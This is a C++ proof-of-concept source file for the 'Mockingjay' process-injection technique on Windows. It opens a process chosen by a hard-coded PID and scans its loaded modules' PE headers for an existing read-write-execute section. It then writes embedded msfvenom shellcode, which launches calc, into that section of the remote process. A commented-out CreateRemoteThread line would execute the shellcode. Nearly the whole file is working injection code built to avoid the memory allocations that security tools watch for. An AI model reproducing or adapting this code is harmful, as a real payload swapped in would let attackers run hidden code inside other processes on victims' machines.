#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <stdint.h>

bool inMemoryMockingjay(DWORD pid);
LPVOID findrwx(HANDLE hProcess, LPMODULEINFO minfo);
VOID procInject(HANDLE hProcess, LPVOID rAddress);

int main()
{
    inMemoryMockingjay(21196);
    return 1;

}

bool inMemoryMockingjay(DWORD pid) {
    LPVOID rAddress;
    //1. OpenProcess
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ| PROCESS_VM_WRITE|PROCESS_VM_OPERATION, FALSE, pid);
    if (hProcess == NULL) {
        printf("OpenProcess failed %d\n", GetLastError());
        return 1;
    }
    printf("[+] Got a handle on Process %d\n", pid);

    //2. EnumProcessModules
    HMODULE* hModules = NULL;
    DWORD cbNeeded;
    DWORD moduleCount;

    if (EnumProcessModules(hProcess, hModules, 0, &cbNeeded)) {
        moduleCount = cbNeeded / sizeof(HMODULE);
        hModules = (HMODULE*)malloc(moduleCount * sizeof(HMODULE));

        if (hModules != NULL) {
            if (EnumProcessModules(hProcess, hModules, cbNeeded, &cbNeeded)) {
                for (DWORD i = 0; i < moduleCount; i++) {
                    //3. GetModuleFileNameEx
                    TCHAR szModName[MAX_PATH];

                    if (GetModuleFileNameEx(hProcess, hModules[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                        printf("%ws\n", szModName);
                    }
                    MODULEINFO minfo;
                    if (GetModuleInformation(hProcess, hModules[i], &minfo, sizeof(MODULEINFO))) {
                        rAddress = findrwx(hProcess, &minfo);
                        if (rAddress != NULL) {
                            procInject(hProcess, rAddress);
                        }
                    }

                }
            }
            free(hModules);
        }


    }

    CloseHandle(hProcess);
    printf("------------------\n");
    return 0;
}

LPVOID findrwx(HANDLE hProcess, LPMODULEINFO minfo) {
    LPVOID lpBuffer, absAddr = NULL;
    SIZE_T dwNumberOfBytesRead;

    lpBuffer = malloc(minfo->SizeOfImage);
    if (lpBuffer == NULL) {
        printf("Failed to allocate memory.\n");
        return 0;
    }
    ReadProcessMemory(hProcess, minfo->lpBaseOfDll, lpBuffer, minfo->SizeOfImage, &dwNumberOfBytesRead);
    if (dwNumberOfBytesRead == 0) {
        printf("Failed to read memory.\n");
        return 0;
    }
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpBuffer + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &(ntHeaders->OptionalHeader);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    int hasDefaultRWXSection = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
    {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_READ &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            hasDefaultRWXSection = 1;
            break;
        }
    }

    if (hasDefaultRWXSection)
    {

        absAddr = LPVOID((int64_t)minfo->lpBaseOfDll + sectionHeader->VirtualAddress);

        printf("Section Name: %.8s\n", sectionHeader->Name);
        printf("Virtual Size: 0x%X\n", sectionHeader->Misc.VirtualSize);
        printf("Virtual Address: 0x%x\n", sectionHeader->VirtualAddress);
        printf("Absolute Address 0x%p\n", absAddr);
        printf("Size of Raw Data: 0x%X\n", sectionHeader->SizeOfRawData);
        printf("Characteristics: 0x%X\n", sectionHeader->Characteristics);
        printf("---------------------------\n");
        free(lpBuffer);
        return absAddr;
    }
    free(lpBuffer);
    return absAddr;

        
}


VOID procInject(HANDLE hProcess, LPVOID rAddress) {
    //msfvenom -f c -p windows/x64/exec cmd=calc                        

    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x00";

    if (!WriteProcessMemory(hProcess, rAddress, buf, sizeof buf, NULL)) {
        printf("Failed to write to Memory %d\n", GetLastError());
    }
    //Ideally this shouldn't be used but it's not guaranteed the code will execute.
    //CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rAddress, NULL, 0, NULL);
}

